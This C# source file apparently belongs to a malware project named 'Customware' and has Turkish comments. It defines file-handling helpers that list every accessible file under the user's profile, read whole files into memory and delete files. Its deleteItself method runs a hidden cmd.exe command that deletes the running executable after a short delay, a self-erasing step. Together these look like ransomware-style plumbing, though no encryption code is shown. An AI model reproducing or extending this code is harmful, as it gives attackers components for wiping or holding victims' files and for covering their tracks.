using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Text;
using System.Threading.Tasks;

namespace Customware
{
    public class FileIO
    {
        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public string getUserDirectory()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        }

        /// <summary>
        /// 
        /// </summary>
        public void deleteItself()
        {
            try
            {
                string exePath = Process.GetCurrentProcess().MainModule.FileName; //exe dosya yolunu al

                // Kendini silmek için exe dosyasını başka bir isimle kopyala ve orijinal dosyayı sil
                string tempFileName = Path.Combine(Path.GetDirectoryName(exePath), Path.GetRandomFileName());
                File.Copy(exePath, tempFileName);
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
                Process.GetCurrentProcess().Kill();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message.ToString());
            }

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public string[] recursiveDirectoryList(string path)
        {
            List<string> files = new List<string>();

            try
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(path);
                DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();

                foreach (var file in directoryInfo.GetFiles("*.*", SearchOption.AllDirectories))
                {

                    try
                    {
                        // dosyayı okumak için erişim izni alınması gerekiyor
                        file.GetAccessControl();

                        // dosya işlemleri burada yapılır
                        Console.WriteLine(file.FullName);
                        files.Add(file.FullName);

                    }
                    catch
                    {
                        // dosyaya erişim izni olmadığından işlem yapılamaz
                        //Console.WriteLine($"Erişim engellendi: {file.FullName}");
                        continue;
                    }

                }

            }
            catch (Exception ex)
            {
                // dosyaya erişim izni olmadığından işlem yapılamaz
                //Console.WriteLine(ex.Message.ToString());
                return null;
                    
            }

            return files.ToArray();

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        /// <param name="whileList"></param>
        /// <returns></returns>
        public string[] recursiveDirectoryListWithWhiteList(string[] paths )
        {
            List<string> list = new List<string>();

            foreach (var path in paths)
            {
                try
                {
                    var dir = Directory.GetFiles(path, "*.*", SearchOption.AllDirectories);

                    foreach (var subdir in dir)
                    {
                        list.Add(subdir);
                    }
                }
                catch (Exception excpt)
                {
                    Console.WriteLine(excpt.Message);
                    Console.WriteLine(path);
                }
            }
            return list.ToArray();

        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public string[] getTopFolders(string path)
        {
            List<string> folders = new List<string>();

            try
            {
                string[] directories = Directory.GetDirectories(path);

                foreach (string directory in directories)
                {
                    string topFolder = new DirectoryInfo(directory).FullName;
                    folders.Add(topFolder);
                }
            }
            catch
            {

            }

            return folders.ToArray();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public void deleteFile(string path)
        {
            try
            {
                File.Delete(path);
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.ToString());
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="fileName"></param>
        /// <returns></returns>
        public byte[] readFile(string fileName)
        {
            try
            {
                long length = new FileInfo(fileName).Length;
                var size = GetSize(length);

                if (size.Item2 == "TB" || (size.Item2 == "GB" && size.Item1 > 6.0))
                {
                    //File is to long
                    return null;
                }

            }
            catch (Exception ex)
            {
                //There is a problem while get file size
                return null;
            }

            try
            {
                using (BinaryReader reader = new BinaryReader(File.Open(fileName, FileMode.Open)))
                {
                    byte[] fileContent = reader.ReadBytes((int)reader.BaseStream.Length);
                    return fileContent;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("There is an error reading file " + fileName);
                return null;
            }
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="length"></param>
        /// <returns></returns>
        private Tuple<double, string> GetSize(long length)
        {
            long B = 0, KB = 1024, MB = KB * 1024, GB = MB * 1024, TB = GB * 1024;
            double size = length;
            string suffix = "B";

            if (length >= TB)
            {
                size = Math.Round((double)length / TB, 2);
                suffix = "TB";
            }
            else if (length >= GB)
            {
                size = Math.Round((double)length / GB, 2);
                suffix = "GB";
            }
            else if (length >= MB)
            {
                size = Math.Round((double)length / MB, 2);
                suffix = "MB";
            }
            else if (length >= KB)
            {
                size = Math.Round((double)length / KB, 2);
                suffix = "KB";
            }

            return Tuple.Create(size, suffix);
        }
    }
}
